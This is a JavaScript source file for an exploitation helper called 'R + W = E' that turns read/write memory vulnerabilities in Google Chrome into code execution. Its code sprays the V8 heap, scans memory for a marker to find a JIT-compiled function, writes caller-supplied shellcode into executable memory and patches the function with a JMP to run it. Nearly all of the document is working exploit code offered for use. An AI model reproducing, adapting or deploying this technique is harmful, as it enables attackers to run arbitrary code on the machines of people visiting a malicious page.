function readPlusWriteEqualsExecute(oReadWriteSploit, aiShellcode) {
/*                             __                                                                                      
                            ,dSSSb,, ,._            _                                                                  
                           dSSSSSSS,YSSSSs,_        Sb-,_                                   _,,sd7                     
                          &SSSSSSSSS[SSSSSP"        SSSSSS=,                             ,sSSSSSP                      
                         [SSSSSSSSSS[SSSS"         [SSSSSSY                              'SSSSSS`                      
                         7SSSP` 7SS'dSSS'           SSSSSS`                               SSSSSP                       
                         'SSS]  JS"iSSS'     _,     7SSSS!                                SSSSS`                       
                          'SSS-,_  SSS]  ,SSS'._   _.,7SS` sdS]=, ,sSSSb,  ,dSSSSbs_=SSs,.SSSSP                        
                            "SSSSS,"SS,,SSS"dSSS`  SSS[SS  'SS]SSSSSSSSSSS'SSSSSSSSSb"SSSSSSSS]                        
                         ,S,_  `7SSb'SSSSSSc'SS]   [SS[S]   SS!SSP"`*YSSSS,SS  'SSSSSL'Y `SSSS                         
                       .SSSSS'   SSP,S   YSSD'SSb,,dS]dS]_,sid SS    [SSSS'SSS7****TSS i ,SSSS                         
                       [SSSSSb,.iS*,SS   iSSP,SSSSSSS YSSSSSS[[SY  _iSSS7`4SSb.__.j,'\dSS*7SSY                         
                        '7SSSSP*`  *"`    `7 `"' ,SSS `S*"` "" `'    `*`   `*7TYYP*` "'`                               
                         `                      sSSS`                                                                  
                                                `"Y'                                                                   
   "R + W = E" is a generic solution for turning "read/write(where, what)" vulnerabilities in Google Chrome into code  
   execution. It should work without modifiction for any such vulnerability. The required arguments are:               
     oReadWriteSploit - an object which exploits such a vulnerability to facilitate reading from and writing to memory.
         This object should implement a "readByte", "readWord", or "readDWord" and a "writeByte", "writeWord", or      
         "writeDWord" method.
     aiShellcode - A shellcode passed as an array of int bytes.                                                        
   The oReadWriteSploit argument is passed to the constructor of a Memory object. This Memory object is a convenience  
   wrapper that allows reading various forms of data from memory, regardless of which read* and write* methods the     
   oReadWriteSploit has implemented.
   */
  var iGuessedHeapSprayAddress = 0x20011100, // Not actually tested to be the most likely place to find the heap spray.
      iHeapSprayArraySize = 0x00040000, // Small enough to fill all nooks & crannies, but large enough to spray fast.
      iHeapSprayArrayCount = 0x800, // Enough to reach the guessed heap spray address, but not so much as to cause OOM.
      iMarker = 0x28081976, // Any not too common value will do, but it cannot have the lsb or msb set (see below).
      oMemory = new Memory(oReadWriteSploit),
      fFunction = function() {};
  // V8 will store variables in an array on the heap as DWORD SMI's. A SMI can be a small ints (0 - 0x7FFFFFFF) shifted
  // left by 1 (lsb will be 0) or a a pointer to a structure that describes the value (with lsb set to 1). If the
  // iMarker value does not have its lsb or msb, it can be shifted right by 1 and get stored as an int SMI on the heap.
  // That way it will be shifted back to left by 1, putting the actual iMarker value on the heap.
  if (iMarker & 0x80000001) throw new Error("iMarker cannot have the low or high bit set");
  // Creating an array with alternating markers and functions will spray the heap with alternating int SMI's containing
  // the iMarker and pointers to a structure that represents the function.
  var axSpray = [iMarker >> 1, fFunction];
  var iSprayCopies = Math.ceil((iHeapSprayArraySize - 0x9C00) / (axSpray.length * 4));
  console.log("Spraying heap with 0x" + iHeapSprayArrayCount.toString(16) + " copies of a ~0x" + iHeapSprayArraySize.toString(16) + " byte array...");
  var aaxHeapSpray = [];
  var axHeap = aaxHeapSpray[0] = []; 
  for (var iBit = 0x80000000; iBit >= 1; iBit /= 2) {
    axHeap = axHeap.concat(axHeap);
    if (iSprayCopies & iBit) axHeap = axHeap.concat(axSpray);
  };
  for (var i = 1; i < iHeapSprayArrayCount; i++) {
    aaxHeapSpray[i] = [].concat(axHeap);
  }
  // The heap spray will create aligned blocks of DWORDs of SMI's. Assuming the value of the marker SMI is sufficiently
  // uncommon, it can be found by scanning the heap for it. This can be done by guessing an address that is very likely
  // to point to memory covered by the heap spray and reading the value stored there. If it's not the marker, it may be
  // the function pointer SMI so the next DWORD may be the marker SMI. If the next DWORD is also not the marker, this
  // memory page may not actually be part of the heap spray, in which case the next memory page is checked.
  if (iGuessedHeapSprayAddress & 3) throw new Error("iGuessedHeapSprayAddress must be DWORD aligned");
  console.log("Scanning heap for 0x" + iMarker.toString(16) + " starting at address 0x" + iGuessedHeapSprayAddress.toString(16) + "...");
  for (
    var iMarkerAddress = iGuessedHeapSprayAddress;
    oMemory.readDWord(iMarkerAddress) != iMarker;
    iMarkerAddress += (iMarkerAddress & 4 ? 0xFFFFC : 4)
  );
  console.log("Found marker at 0x" + iMarkerAddress.toString(16));
  // Each marker is followed by a SMI with a pointer to the function structure (set lsb to 0 to get the pointer):
  var iFunctionStructureAddress = oMemory.readDWord(iMarkerAddress + 4) - 1;
  console.log("Found function structure at 0x" + iFunctionStructureAddress.toString(16));
  // This function structure contains a pointer to the JIT compiled code at a specific offset:
  var iFunctionCodeAddress = oMemory.readDWord(iFunctionStructureAddress + 0xC);
  console.log("Found function code at 0x" + iFunctionCodeAddress.toString(16));
  // The JIT compiled code is in RWE memory, so the shellcode can be stored in the same memory block. Normally there
  // will be some unused memory which is filled with NULLs at higher addresses that can be used to store the shellcode.
  // The code will look for a number of NULLs in this heap block larger than the shellcode, in which to store the
  // shellcode at the end. This allows V8 to allocate additional memory, overwriting the first NULLs without touching
  // the memory where the shellcode will be stored.
  var iNULLSpaceSize = 0x8000 + aiShellcode.length; // Leave some room for V8
  console.log("Scanning heap for 0x" + iNULLSpaceSize.toString(16) + " NULL bytes starting at address 0x" + iFunctionCodeAddress.toString(16) + "...");
  for (var iNULLSpaceAddress = iFunctionCodeAddress; true; iNULLSpaceAddress += Math.max(iIndex, 0x100)) {
    for (var iIndex = 0; iIndex < iNULLSpaceSize; iIndex++) {
      if (oMemory.readByte(iNULLSpaceAddress + iIndex) != 0) break;
    }
    if (iIndex == iNULLSpaceSize) break;
  }
  console.log("Found NULLs at 0x" + iNULLSpaceAddress.toString(16));
  // The shellcode can be written over these NULLs relatively safely.
  var iShellcodeAddress = iNULLSpaceAddress + iNULLSpaceSize - aiShellcode.length;
  console.log("Storing shellcode at 0x" + iShellcodeAddress.toString(16));
  oMemory.writeBytes(iShellcodeAddress, aiShellcode);
  // The pointer to the JIT compiled code cannot simply be overwritten because it's some kind of magic value.
  // But the JIT compiled code itself can be overwritten with a JMP to the shellcode. The code is a lot larger than
  // this jump, so this does not overwrite anything vital. A backup of the original code must be made in order to
  // restore it later:
  console.log("Reading start of original function code...");
  var aiOriginalCode = oMemory.readBytes(iFunctionCodeAddress, 5);
  console.log("Overwriting original function code with JMP to shellcode...");
  oMemory.writeByte(iFunctionCodeAddress, 0xE9); // JMP opcode
  oMemory.writeDWord(iFunctionCodeAddress + 1, iShellcodeAddress - iFunctionCodeAddress - 5); // JMP offset
  // By executing the javascript function, the shellcode gets executed:
  console.log("Calling function to execute shellcode...");
  fFunction();
  // If the shellcode does proper cleanup and returns, the original JIT compiled code of fFunction can be restored.
  console.log("Restoring start of original function code...");
  oMemory.writeBytes(iFunctionCodeAddress, aiOriginalCode);
  // And the shellcode can be overwritten with NULLs again.
  console.log("Restoring NULLs...");
  for (var iIndex = 0; iIndex < aiShellcode.length; iIndex++) {
    oMemory.writeByte(iShellcodeAddress + iIndex, 0);
  }
  console.log("Done.");
  // Finally, the browser can continue to run as normal.
}
